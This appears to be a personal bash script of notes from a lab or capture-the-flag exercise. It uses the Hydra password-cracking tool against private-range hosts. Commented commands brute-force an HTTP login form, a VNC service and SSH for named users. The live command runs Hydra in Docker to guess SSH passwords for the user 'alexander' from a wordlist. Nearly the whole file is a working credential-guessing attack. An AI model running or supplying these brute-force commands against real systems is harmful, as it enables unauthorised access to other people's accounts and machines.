#!/bin/bash

# http web form crack
# hydra -l molly -P /usr/share/hydra/dpl4hydra_local.csv 10.10.192.3 \
# http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V -t 4    

# VNC crack
# hydra -P ./passlist.txt 10.10.5.50 vnc -V -t 4

# ssh
# hydra -l alexander -P ./passlist.txt ssh://10.10.5.50 -V -t 4

    # hydra flags
    # -l login
    # -P specify passlist file
    # protocol://address
    # -V (verbose) print each try
    # -t restrict threads
docker run -v /home/pickle/Documents/is/hydra:/main \
    -w /main \
    --rm vanhauser/hydra \
    -l alexander \
    -P passlist.txt \
    ssh://10.10.167.33 \
    -V \
    -t 4

